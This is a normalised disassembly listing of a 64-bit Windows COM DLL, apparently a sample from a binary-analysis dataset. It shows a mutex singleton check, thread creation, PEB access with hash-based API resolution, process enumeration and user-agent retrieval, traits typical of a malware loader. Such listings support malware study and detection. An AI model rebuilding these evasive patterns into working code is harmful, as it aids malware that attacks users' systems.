mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
mov rsi rdx
mov rdi rcx
mov edx 0x8
mov rcx r8
mov rbx r8
call [ IsBadWritePtr@IAT ]
test eax eax
je r-xdata
and [ rbx ] 0x0
cmp [ rdi + 0x20 ] 0x0
jne r-xdata
mov eax 0x80004003
jmp r-xdata
mov rcx [ rdi + 0x20 ]
mov r8 rbx
mov rdx rsi
mov rax [ rcx ]
call [ rax ]
mov eax 0x80004005
jmp r-xdata
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
sub_180008fc0
mov [ rsp + 0x10 ] rbx
push rdi
sub rsp 0x20
cmp [ rcx + 0x20 ] 0x0
mov rbx rcx
je r-xdata
mov rbx [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
mov rcx [ rcx + 0x20 ]
lea r8 [ rsp + 0x30 ]
lea rdx [ r--data ]
mov rax [ rcx ]
call [ rax ]
test eax eax
js r-xdata
mov rcx [ rsp + 0x30 ]
lea r8 [ rbx + 0x28 ]
lea rdx [ r--data ]
mov rax [ rcx ]
call [ rax + 0x20 ]
test eax eax
jns r-xdata
mov rcx [ rbx + 0x28 ]
lea r8 [ rbx + 0x30 ]
lea rdx [ rw-data ]
mov rax [ rcx ]
call [ rax + 0x28 ]
mov rcx [ rsp + 0x30 ]
mov rax [ rcx ]
call [ rax + 0x10 ]
jmp r-xdata
sub_180009034
push rbx
sub rsp 0x20
mov rbx rcx
mov rcx [ rcx + 0x28 ]
test rcx rcx
je r-xdata
mov rcx [ rbx + 0x20 ]
test rcx rcx
je r-xdata
mov rax [ rcx ]
mov edx [ rbx + 0x30 ]
call [ rax + 0x30 ]
mov rcx [ rbx + 0x28 ]
and [ rbx + 0x30 ] 0x0
mov rax [ rcx ]
call [ rax + 0x10 ]
and [ rbx + 0x28 ] 0x0
add rsp 0x20
pop rbx
retn
mov rax [ rcx ]
call [ rax + 0x10 ]
and [ rbx + 0x20 ] 0x0
sub_18000907c
push rbx
sub rsp 0x20
or ebx 0xffffffff
[ rcx + 0x8 ] ebx
dec ebx
jne r-xdata
mov eax ebx
add rsp 0x20
pop rbx
retn
test rcx rcx
je r-xdata
mov r8 [ rcx ]
lea edx [ rbx + 0x1 ]
call [ r8 + 0x28 ]
sub_1800090a8
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x20
mov rbp rdx
mov rbx rcx
mov edx 0x8
mov rcx r8
mov rsi r8
call [ IsBadWritePtr@IAT ]
test eax eax
je r-xdata
and [ rsi ] 0x0
xor edi edi
cmp [ rbx + 0x18 ] edi
jle r-xdata
mov eax 0x80004003
jmp r-xdata
mov eax 0x80004002
movsxd rdx edi
mov r8d 0x10
mov rcx rbp
shl rdx 0x4
add rdx [ rbx + 0x10 ]
call sub_180001768
test eax eax
je r-xdata
mov rbx [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
add rsp 0x20
pop rdi
retn
mov [ rsi ] rbx
mov rax [ rbx ]
mov rcx rbx
call [ rax + 0x8 ]
xor eax eax
jmp r-xdata
inc edi
cmp edi [ rbx + 0x18 ]
jl r-xdata
sub_180009148
push rbx
sub rsp 0x20
lea rax [ r--data ]
mov rbx rcx
mov [ rcx ] rax
[ rw-data ]
test dl 0x1
je r-xdata
mov rax rbx
add rsp 0x20
pop rbx
retn
call sub_180002148
sub_180009178
push rbx
sub rsp 0x20
mov ecx 0x45
call sub_180002178
test rax rax
je r-xdata
xor ebx ebx
mov rcx rax
call sub_180006e94
mov rbx rax
jmp r-xdata
mov rcx rbx
call sub_180008784
init
mov [ rsp + 0x10 ] rbx
push rsi
sub rsp 0x60
mov ecx 0x8
call sub_180002178
test rax rax
je r-xdata
and [ rw-data ] 0x0
mov rcx rax
call sub_1800017dc
mov [ rw-data ] rax
jmp r-xdata
mov al 0x1
mov rbx [ rsp + 0x78 ]
add rsp 0x60
pop rsi
retn
lea rax [ rsp + 0x70 ]
lea r8 [ sub_180009178 ]
xor r9d r9d
mov [ rsp + 0x28 ] rax
and [ rsp + 0x20 ] 0x0
xor edx edx
xor ecx ecx
call [ CreateThread@IAT ]
mov r11 [ rw-data ]
mov rbx [ r11 ]
call [ GetLastError@IAT ]
mov rcx [ rw-data ]
mov r9d 0x1
mov [ rsp + 0x28 ] eax
lea rdx [ r--data ]
lea r8d [ r9 + 0x1 ]
mov [ rsp + 0x20 ] rsi
call [ rbx ]
jmp r-xdata
lea r8 [ r--data ]
xor edx edx
xor ecx ecx
call [ CreateMutexA@IAT ]
mov r11 [ rw-data ]
mov rbx [ r11 ]
call [ GetLastError@IAT ]
mov rcx [ rw-data ]
mov r9d 0x1
mov [ rsp + 0x28 ] eax
lea rsi [ r--data ]
lea rdx [ r--data ]
mov r8d r9d
mov [ rsp + 0x20 ] rsi
call [ rbx ]
call [ GetLastError@IAT ]
cmp eax 0xb7
je r-xdata
lea rcx [ rsp + 0x30 ]
xor r9d r9d
xor r8d r8d
xor edx edx
call [ GetMessageA@IAT ]
test eax eax
jne r-xdata
lea rcx [ rsp + 0x30 ]
call [ TranslateMessage@IAT ]
lea rcx [ rsp + 0x30 ]
call [ DispatchMessageA@IAT ]
sub_1800092e0
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rsi
mov [ rax + 0x18 ] rdi
push rbp
push r12
push r13
lea rbp [ rax - 0x37 ]
sub rsp 0xc0
mov r12d edx
mov rcx r8
lea rdx [ r--data ]
mov r8d 0x10
call sub_180001768
xor r13d r13d
test eax eax
je r-xdata
mov edi 0x5
lea rbx [ rbp - 0x61 ]
mov esi edi
mov eax 0x80020001
jmp r-xdata
mov rcx rbx
call [ VariantInit@IAT ]
add rbx 0x18
dec rsi
jne r-xdata
cmp r12d 0xfa
jne r-xdata
lea r11 [ rsp + 0xc0 ]
mov rbx [ r11 + 0x20 ]
mov rsi [ r11 + 0x28 ]
mov rdi [ r11 + 0x30 ]
mov rsp r11
pop r13
pop r12
pop rbp
retn
lea rbx [ rbp - 0x61 ]
mov rbx [ rbp + 0x67 ]
mov esi 0x8
lea rcx [ rbp - 0x61 ]
mov rdx [ rbx ]
mov r9d esi
xor r8d r8d
add rdx 0x78
call [ VariantChangeType@IAT ]
mov rdx [ rbx ]
lea r9d [ rsi - 0x5 ]
lea rcx [ rbp - 0x49 ]
add rdx 0x60
xor r8d r8d
call [ VariantChangeType@IAT ]
mov rdx [ rbx ]
lea rcx [ rbp - 0x31 ]
add rdx 0x48
mov r9d esi
xor r8d r8d
call [ VariantChangeType@IAT ]
mov rdx [ rbx ]
lea rcx [ rbp - 0x19 ]
add rdx 0x30
mov r9d 0x2011
xor r8d r8d
call [ VariantChangeType@IAT ]
mov rdx [ rbx ]
lea rcx [ rbp - 0x1 ]
add rdx 0x18
mov r9d esi
xor r8d r8d
call [ VariantChangeType@IAT ]
movzx r11d [ rbp - 0x19 ]
test r11w r11w
je r-xdata
mov rcx rbx
call [ VariantClear@IAT ]
add rbx 0x18
dec rdi
jne r-xdata
xor eax eax
mov [ rbp - 0x79 ] r13
mov rcx [ rbp - 0x11 ]
lea r8 [ rbp - 0x71 ]
xor edx edx
call [ SafeArrayGetLBound@IAT ]
mov rcx [ rbp - 0x11 ]
lea r8 [ rsp + 0x20 ]
xor edx edx
call [ SafeArrayGetUBound@IAT ]
mov rcx [ rbp - 0x11 ]
lea rdx [ rbp - 0x79 ]
call [ SafeArrayAccessData@IAT ]
movzx r11d [ rbp - 0x19 ]
jmp r-xdata
mov rax [ rbx ]
mov rcx [ rax + 0x8 ]
test sil sil
je r-xdata
mov rcx [ rbp - 0x11 ]
call [ SafeArrayUnaccessData@IAT ]
mov rax [ rbx ]
mov rcx [ rax + 0x8 ]
cmp [ rcx ] r13w
setne sil
test r11w r11w
je r-xdata
mov [ rcx ] r13w
or eax 0xffffffff
mov [ rcx ] ax
jmp r-xdata
sub_1800094b4
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
mov rbx rdx
mov rdi rcx
test rdx rdx
je r-xdata
mov rcx rdi
call sub_180009034
test rbx rbx
je r-xdata
mov rax [ rdx ]
mov rcx rdx
call [ rax + 0x8 ]
xor eax eax
mov rax [ rbx ]
lea r8 [ rdi + 0x20 ]
lea rdx [ r--data ]
mov rcx rbx
call [ rax ]
mov rdx [ rbx ]
mov rcx rbx
mov esi eax
call [ rdx + 0x10 ]
test esi esi
jns r-xdata
mov rcx rdi
call sub_180008fc0
mov eax esi
jmp r-xdata
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
sub_180009524
push rbx
sub rsp 0x20
lea rax [ r--data ]
mov rbx rcx
mov [ rcx ] rax
[ rw-data ]
test dl 0x1
je r-xdata
mov rax rbx
add rsp 0x20
pop rbx
retn
call sub_180002148
sub_180009554
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov ebx edx
mov rdi rcx
call sub_180009484
test bl 0x1
je r-xdata
mov rax rdi
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rcx rdi
call sub_180002148
DllGetClassObject
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x30
mov rsi rcx
mov ecx 0x8
mov rdi r8
mov rbp rdx
call sub_180002178
test rax rax
je r-xdata
and [ rw-data ] 0x0
mov rcx rax
call sub_1800017dc
mov [ rw-data ] rax
jmp r-xdata
mov edx 0x8
mov rcx rdi
call [ IsBadWritePtr@IAT ]
test eax eax
je r-xdata
mov rax [ rw-data ]
mov rbx [ rax ]
call [ GetLastError@IAT ]
mov rcx [ rw-data ]
mov [ rsp + 0x28 ] eax
mov r9d 0x1
lea rax [ r--data ]
lea r8d [ r9 + 0x2 ]
lea rdx [ r--data ]
mov [ rsp + 0x20 ] rax
call [ rbx ]
lea rdx [ r--data ]
mov r8d 0x10
mov rcx rsi
call sub_180001768
test eax eax
je r-xdata
lea rdx [ r--data ]
mov r8d 0x10
mov rcx rsi
call sub_180001768
test eax eax
je r-xdata
and [ rdi ] 0x0
mov ecx 0x20
call sub_180002178
mov rbx rax
test rax rax
je r-xdata
mov eax 0x80004003
jmp r-xdata
mov rax [ rw-data ]
mov rbx [ rax ]
call [ GetLastError@IAT ]
mov rcx [ rw-data ]
mov [ rsp + 0x28 ] eax
mov r9d 0x1
lea rax [ r--data ]
lea r8d [ r9 + 0x3 ]
lea rdx [ r--data ]
mov [ rsp + 0x20 ] rax
call [ rbx ]
mov eax 0x80040111
jmp r-xdata
xor ebx ebx
lea rax [ r--data ]
mov [ rbx ] rax
mov [ rbx + 0x8 ] 0x0
[ rw-data ]
lea rax [ rw-data ]
mov [ rbx + 0x18 ] 0x2
mov [ rbx + 0x10 ] rax
lea rax [ r--data ]
mov [ rbx ] rax
jmp r-xdata
mov rbx [ rsp + 0x40 ]
mov rbp [ rsp + 0x48 ]
mov rsi [ rsp + 0x50 ]
add rsp 0x30
pop rdi
retn
mov rax [ rbx ]
mov r8 rdi
mov rdx rbp
mov rcx rbx
call [ rax ]
test eax eax
jns r-xdata
mov eax 0x8007000e
jmp r-xdata
test rbx rbx
jne r-xdata
lea r8 [ r--data ]
xor edx edx
xor ecx ecx
call [ CreateMutexA@IAT ]
call [ GetLastError@IAT ]
cmp eax 0xb7
je r-xdata
mov rax [ rbx ]
mov edx 0x1
mov rcx rbx
call [ rax + 0x28 ]
xor eax eax
lea rax [ rsp + 0x58 ]
lea r8 [ sub_180009178 ]
xor r9d r9d
mov [ rsp + 0x28 ] rax
and [ rsp + 0x20 ] 0x0
xor edx edx
xor ecx ecx
call [ CreateThread@IAT ]
sub_18000976c
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
mov rdi r9
mov rsi r8
test rdx rdx
je r-xdata
mov edx 0x8
mov rcx r9
call [ IsBadWritePtr@IAT ]
test eax eax
je r-xdata
mov eax 0x80040110
jmp r-xdata
and [ rdi ] 0x0
mov ecx 0x38
call sub_180002178
mov rbx rax
test rax rax
je r-xdata
mov eax 0x80004003
jmp r-xdata
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
xor ebx ebx
lea rax [ r--data ]
mov [ rbx ] rax
mov [ rbx + 0x8 ] 0x0
[ rw-data ]
and [ rbx + 0x30 ] 0x0
and [ rbx + 0x20 ] 0x0
and [ rbx + 0x28 ] 0x0
lea rax [ rw-data ]
mov [ rbx + 0x18 ] 0x2
mov [ rbx + 0x10 ] rax
lea rax [ r--data ]
mov [ rbx ] rax
jmp r-xdata
mov rax [ rbx ]
mov r8 rdi
mov rdx rsi
mov rcx rbx
call [ rax ]
mov edi eax
test eax eax
jns r-xdata
mov eax 0x8007000e
jmp r-xdata
test rbx rbx
jne r-xdata
mov eax edi
mov r8 [ rbx ]
mov edx 0x1
mov rcx rbx
call [ r8 + 0x28 ]
sub_18000984c
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x30
mov rsi rdx
mov rbp rcx
mov edx 0x3d
mov rcx rsi
call sub_18000172c
mov rdi rax
test rax rax
je r-xdata
mov rbx [ rsp + 0x60 ]
mov rbp [ rsp + 0x68 ]
mov rsi [ rsp + 0x70 ]
add rsp 0x30
pop r15
pop r14
pop r13
pop r12
pop rdi
retn
mov r15d 0x1
mov [ rax ] 0x0
mov rcx [ rbp ]
lea rdx [ r--data ]
lea r8d [ r15 + 0x7 ]
add rdi r15
call sub_1800015ec
mov rcx [ rw-data ]
mov rbx [ rcx ]
mov r14 rax
call [ GetLastError@IAT ]
mov rcx [ rw-data ]
mov [ rsp + 0x28 ] eax
lea r13 [ r--data ]
lea rdx [ r--data ]
mov r9d r15d
mov r8d r15d
mov [ rsp + 0x20 ] r13
call [ rbx ]
mov rcx [ rbp ]
lea r8d [ r15 + 0x9 ]
lea rdx [ r--data ]
call sub_1800015ec
mov rcx [ rw-data ]
mov rbx [ rcx ]
mov r12 rax
call [ GetLastError@IAT ]
mov rcx [ rw-data ]
mov [ rsp + 0x28 ] eax
lea r8d [ r15 + 0x1 ]
lea rdx [ r--data ]
mov r9d r15d
mov [ rsp + 0x20 ] r13
call [ rbx ]
mov rcx [ rbp ]
lea r8d [ r15 + 0x5 ]
lea rdx [ r--data ]
call sub_1800015ec
mov rcx [ rw-data ]
mov rbx [ rcx ]
mov r13 rax
call [ GetLastError@IAT ]
mov rcx [ rw-data ]
mov [ rsp + 0x28 ] eax
lea rax [ r--data ]
lea r8d [ r15 + 0x2 ]
lea rdx [ r--data ]
mov r9d r15d
mov [ rsp + 0x20 ] rax
call [ rbx ]
mov rdx r14
mov rcx rsi
call [ lstrcmpiA@IAT ]
test eax eax
jne r-xdata
mov rdx r12
mov rcx rsi
call [ lstrcmpiA@IAT ]
test eax eax
jne r-xdata
mov rax [ rw-data ]
mov rbx [ rax ]
call [ GetLastError@IAT ]
mov rcx [ rw-data ]
mov [ rsp + 0x28 ] eax
lea rax [ r--data ]
lea r8d [ r15 + 0x3 ]
lea rdx [ r--data ]
mov r9d r15d
mov [ rsp + 0x20 ] rax
call [ rbx ]
mov rcx [ rbp + 0x8 ]
mov rdx rdi
call sub_1800018a8
jmp r-xdata
mov rdx r13
mov rcx rsi
call [ lstrcmpiA@IAT ]
test eax eax
jne r-xdata
mov rax [ rw-data ]
mov rbx [ rax ]
call [ GetLastError@IAT ]
mov rcx [ rw-data ]
mov [ rsp + 0x28 ] eax
lea rax [ r--data ]
lea rdx [ r--data ]
mov r9d r15d
mov r8d 0x5
mov [ rsp + 0x20 ] rax
call [ rbx ]
mov rcx [ rbp + 0x8 ]
mov rdx rdi
call sub_1800018c0
jmp r-xdata
mov rcx r13
call j_sub_180002148
mov rcx r12
call j_sub_180002148
mov rcx r14
call j_sub_180002148
mov rax [ rw-data ]
mov rbx [ rax ]
call [ GetLastError@IAT ]
mov rcx [ rw-data ]
mov [ rsp + 0x28 ] eax
lea rax [ r--data ]
lea rdx [ r--data ]
mov r9d r15d
mov r8d 0x6
mov [ rsp + 0x20 ] rax
call [ rbx ]
mov rcx [ rbp + 0x8 ]
mov rdx rdi
call sub_180001994
sub_180009ab0
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x30
mov eax [ rcx + 0x1c ]
mov rdi rcx
cmp [ rcx + 0x18 ] eax
jae r-xdata
xor al al
mov r14d 0x1
lea r12 [ r--data ]
lea r15 [ r--data ]
mov rcx [ rdi ]
lea rdx [ r--data ]
mov r8d 0x6
call sub_1800015ec
mov r13 rax
mov rax [ rw-data ]
mov rbx [ rax ]
call [ GetLastError@IAT ]
mov rcx [ rw-data ]
mov [ rsp + 0x28 ] eax
mov r9d r14d
mov r8d 0x7
mov rdx r15
mov [ rsp + 0x20 ] r12
call [ rbx ]
mov rcx [ rdi ]
lea rdx [ r--data ]
mov r8d 0x7
call sub_1800015ec
mov rsi rax
mov rax [ rw-data ]
mov rbx [ rax ]
call [ GetLastError@IAT ]
mov rcx [ rw-data ]
mov [ rsp + 0x28 ] eax
mov r9d r14d
mov r8d 0x8
mov rdx r15
mov [ rsp + 0x20 ] r12
call [ rbx ]
mov rcx [ rdi ]
lea rdx [ r--data ]
mov r8d 0x6
call sub_1800015ec
mov rbp rax
mov rax [ rw-data ]
mov rbx [ rax ]
call [ GetLastError@IAT ]
mov rcx [ rw-data ]
mov [ rsp + 0x28 ] eax
mov r9d r14d
mov r8d 0x9
mov rdx r15
mov [ rsp + 0x20 ] r12
call [ rbx ]
mov rcx [ rdi ]
lea rdx [ r--data ]
mov r8d 0x7
call sub_1800015ec
mov r12 rax
mov rax [ rw-data ]
mov rbx [ rax ]
call [ GetLastError@IAT ]
mov rcx [ rw-data ]
mov [ rsp + 0x28 ] eax
lea rax [ r--data ]
mov r9d r14d
mov r8d 0xa
mov rdx r15
mov [ rsp + 0x20 ] rax
call [ rbx ]
mov rcx [ rdi + 0x10 ]
mov rdx r13
call [ lstrcmpiA@IAT ]
test eax eax
jne r-xdata
inc rax
add [ rdi + 0x18 ] r14d
mov [ rdi + 0x10 ] rax
jmp r-xdata
mov rcx [ rdi + 0x10 ]
mov rdx rsi
call [ lstrcmpiA@IAT ]
test eax eax
jne r-xdata
mov rax [ rw-data ]
mov rbx [ rax ]
call [ GetLastError@IAT ]
mov rcx [ rw-data ]
mov [ rsp + 0x28 ] eax
lea rax [ r--data ]
mov r9d r14d
mov r8d 0xb
mov rdx r15
mov [ rsp + 0x20 ] rax
call [ rbx ]
mov ecx 0x22
call sub_180002178
test rax rax
je r-xdata
mov eax [ rdi + 0x1c ]
cmp [ rdi + 0x18 ] eax
jb r-xdata
mov rcx [ rdi + 0x10 ]
mov rdx rbp
call [ lstrcmpiA@IAT ]
test eax eax
jne r-xdata
mov rcx [ rdi + 0x8 ]
call sub_1800018b8
jmp r-xdata
mov [ rdi + 0x8 ] rax
jmp r-xdata
mov rcx rax
call sub_180001864
mov rax [ rdi + 0x10 ]
cmp [ rax ] 0x0
jne r-xdata
mov rcx [ rdi + 0x10 ]
mov rdx r12
call [ lstrcmpiA@IAT ]
test eax eax
je r-xdata
mov rcx [ rdi + 0x8 ]
call sub_18000199c
jmp r-xdata
mov rcx [ rdi + 0x10 ]
call [ lstrlenA@IAT ]
mov rcx [ rdi + 0x10 ]
add [ rdi + 0x18 ] eax
call [ lstrlenA@IAT ]
movsxd rcx eax
add [ rdi + 0x10 ] rcx
mov rcx r12
call j_sub_180002148
mov rcx rbp
call j_sub_180002148
mov rcx rsi
call j_sub_180002148
mov rcx r13
call j_sub_180002148
lea r12 [ r--data ]
mov rcx [ rdi + 0x10 ]
call [ lstrlenA@IAT ]
mov rcx [ rdi + 0x10 ]
add [ rdi + 0x18 ] eax
call [ lstrlenA@IAT ]
movsxd rcx eax
add [ rdi + 0x10 ] rcx
mov rcx r12
call j_sub_180002148
mov rcx rbp
call j_sub_180002148
mov rcx rsi
call j_sub_180002148
mov rcx r13
call j_sub_180002148
mov al r14b
jmp r-xdata
mov rdx [ rdi + 0x10 ]
mov rcx rdi
call sub_18000984c
mov rbx [ rsp + 0x60 ]
mov rbp [ rsp + 0x68 ]
mov rsi [ rsp + 0x70 ]
add rsp 0x30
pop r15
pop r14
pop r13
pop r12
pop rdi
retn
sub_180009da0
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
mov rbx rcx
mov ecx 0x18
mov esi r8d
mov rdi rdx
call sub_180002178
test rax rax
je r-xdata
and [ rbx + 0x18 ] 0x0
and [ rbx + 0x8 ] 0x0
mov [ rbx ] rax
mov [ rbx + 0x1c ] esi
mov [ rbx + 0x10 ] rdi
test esi esi
je r-xdata
mov rcx rax
call sub_1800011ec
mov rsi [ rsp + 0x38 ]
mov rax rbx
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rax rsi
mov [ rdi ] 0x0
cmp [ rdi ] 0xa
jne r-xdata
cmp [ rdi ] 0xd
je r-xdata
inc rdi
dec rax
jne r-xdata
sub_180009e14
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov rdi [ rcx ]
mov rbx rcx
test rdi rdi
je r-xdata
and [ rbx + 0x18 ] 0x0
and [ rbx + 0x1c ] 0x0
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rcx rdi
call sub_180001664
mov rcx rdi
call sub_180002148
sub_180009e4c
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
mov [ rsp + 0x18 ] rdi
push r12
sub rsp 0x30
mov rdi rcx
mov rcx [ rcx + 0x8 ]
call sub_1800019a4
mov r11 [ rw-data ]
mov rbx [ r11 ]
call [ GetLastError@IAT ]
mov rcx [ rw-data ]
mov r9d 0x1
mov [ rsp + 0x28 ] eax
lea r12 [ r--data ]
lea r8d [ r9 + 0xb ]
lea rdx [ r--data ]
mov [ rsp + 0x20 ] r12
call [ rbx ]
mov ecx 0x401
call j_sub_180002178
mov rsi rax
call [ GetLastError@IAT ]
mov rcx [ rdi + 0x8 ]
mov ebx eax
call sub_1800018b0
lea rdx [ r--data ]
mov r9d ebx
mov rcx rsi
mov r8 rax
call [ wsprintfA@IAT ]
mov r11 [ rw-data ]
mov rbx [ r11 ]
call [ GetLastError@IAT ]
mov rcx [ rw-data ]
mov r9d 0x1
mov [ rsp + 0x28 ] eax
lea rdx [ r--data ]
lea r8d [ r9 + 0xc ]
mov [ rsp + 0x20 ] r12
call [ rbx ]
mov rbx [ rdi + 0x8 ]
test rbx rbx
je r-xdata
mov rbx [ rsp + 0x40 ]
mov rdi [ rsp + 0x50 ]
mov rax rsi
mov rsi [ rsp + 0x48 ]
add rsp 0x30
pop r12
retn
mov rcx rbx
call sub_180001d7c
mov rcx rbx
call sub_180002148
sub_180001708
push rbx
sub rsp 0x20
mov rax r8
movzx ebx dx
mov r8d r9d
mov rdx rax
call sub_1800016c8
cmp bx ax
sete al
add rsp 0x20
pop rbx
retn
DllUnregisterServer
xor eax eax
retn
sub_1800017dc
lea rax [ r--data ]
mov [ rcx ] rax
mov rax rcx
retn
sub_1800018a8
mov [ rcx + 0x8 ] rdx
retn
sub_1800018b0
mov rax [ rcx + 0x8 ]
retn
sub_1800018b8
mov [ rcx + 0x20 ] 0x1
retn
sub_180001994
mov [ rcx + 0x18 ] rdx
retn
sub_18000199c
mov [ rcx + 0x21 ] 0x1
retn
sub_180001dbc
mov rcx [ rcx ]
jmp j_sub_180002148
sub_180001ef8
push rbx
sub rsp 0x20
mov rbx rcx
call sub_180001e98
mov rax rbx
add rsp 0x20
pop rbx
retn
j_sub_180002178
jmp sub_180002178
sub_180002280
mov rax rcx
retn
sub_180002484
mov al 0x40
retn
sub_1800032c8
mov rax [ gs : 0x60 ]
retn
sub_180003330
sub rsp 0x28
mov rax [ rw-data ]
test rax rax
jne r-xdata
add rsp 0x28
retn
mov ecx 0x4b1ffe8e
call sub_1800032d4
mov [ rw-data ] rax
sub_1800033f0
lea eax [ rcx - 0x1 ]
xor edx edx
cmp eax 0x239
ja r-xdata
mov rax rdx
retn
lea rdx [ rw-data ]
movsxd rax ecx
mov rdx [ rdx + rax * 8 ]
sub_180003410
lea eax [ rcx - 0x1 ]
cmp eax 0x239
ja r-xdata
xor al al
retn
movsxd rax ecx
lea rcx [ rw-data ]
mov [ rcx + rax * 8 ] rdx
mov al 0x1
retn
sub_1800036ac
push rbx
sub rsp 0x20
mov edx 0x1
mov rbx rcx
mov r8d 0xa48d6762
lea r9d [ rdx + 0x2a ]
xor ecx ecx
call sub_18000365c
mov rcx rbx
add rsp 0x20
pop rbx
jmp rax
sub_180003f94
cmp ecx 0xffffffff
jne r-xdata
jmp sub_180003f1c
xor al al
retn
j_sub_1800042fc
jmp sub_1800042fc
sub_1800053f8
push rbx
sub rsp 0x20
lea rax [ r--data ]
mov rbx rcx
mov [ rcx ] rax
test dl 0x1
je r-xdata
mov rax rbx
add rsp 0x20
pop rbx
retn
call j_sub_1800042fc
sub_180005b20
lea rax [ r--data ]
retn
_start
sub rsp 0x28
cmp edx 0x1
jne r-xdata
mov eax 0x1
add rsp 0x28
retn
mov [ rw-data ] rcx
call [ DisableThreadLibraryCalls@IAT ]
DllCanUnloadNow
mov ecx [ rw-data ]
xor eax eax
test ecx ecx
setg al
retn
sub_180008e98
test edx edx
je r-xdata
[ rw-data ]
[ rw-data ]
jmp r-xdata
xor eax eax
retn
sub_180008f4c
mov eax 0x1
retn
sub_180008f54
mov eax 0x80004001
retn
sub_180009138
mov eax 0x1
[ rcx + 0x8 ] eax
inc eax
retn
sub_180009484
push rbx
sub rsp 0x20
lea rax [ r--data ]
mov rbx rcx
mov [ rcx ] rax
call sub_180009034
lea r11 [ r--data ]
mov [ rbx ] r11
[ rw-data ]
add rsp 0x20
pop rbx
retn
sub_180009d94
mov rcx [ rcx + 0x8 ]
jmp sub_1800018b0
ObtainUserAgentString
jmp [ ObtainUserAgentString@IAT ]
Process32Next
jmp [ Process32Next@IAT ]
Process32First
jmp [ Process32First@IAT ]
CreateToolhelp32Snapshot
jmp [ CreateToolhelp32Snapshot@IAT ]
sub_180009f58
movups xmm0 [ r--data ]
movups xmm1 [ r--data ]
movdqu [ rw-data ] xmm0
movdqu [ rw-data ] xmm1
retn
